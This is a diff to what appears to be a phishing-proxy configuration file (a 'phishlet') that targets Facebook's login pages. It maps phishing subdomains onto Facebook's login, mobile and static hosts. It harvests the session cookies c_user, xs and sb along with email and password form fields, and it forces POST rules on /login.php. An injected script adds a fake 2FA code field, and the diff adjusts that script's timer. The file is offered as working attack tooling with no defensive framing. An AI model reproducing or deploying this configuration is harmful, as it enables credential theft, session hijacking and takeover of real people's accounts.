@@ -1,3 +1,43 @@
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # Phishing subdomain for Facebook login page.
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
+  # Mobile version of Facebook login.
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  # Static content for Facebook, such as images and scripts.
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false, auto_filter: true}
+
+# Authentication tokens configurations: Capturing and handling session cookies.
+auth_tokens:
+  # Targeting Facebook domain (trigger)
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'sb']
+    type: 'cookie'
+
+# Credentials configurations: Defining how to extract user credentials.
+credentials:
+  # Capturing username from the Facebook login form.
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  # Capturing password from the Facebook login form.
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+
+# Force POST request configurations: Manipulating form submissions.
+force_post:
+  # Intercepting and modifying POST data on the login path.
+  - path: '/login.php'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'pass', search: '.*'}
+    type: 'post'
+
+############################
 # After capturing the username and password, you can add a section to capture the 2FA code.
 force_post:
   # Intercepting and modifying POST data on the login path.
@@ -28,5 +68,11 @@ js_inject:
               twoFactorField.setAttribute('name', '2fa_code');
               twoFactorField.setAttribute('placeholder', 'Enter 2FA code');
               document.querySelector('form').appendChild(twoFactorField);
-          }, 3000);  // Adjust timing as necessary.
+          }, 2000);  // Adjust timing as necessary.
       });
+# Login page configuration: Defining the entry point for phishing.
+
+login:
+  # Setting the login domain and path for the initial phishing page.
+  domain: 'www.facebook.com'
+  path: '/login.php'
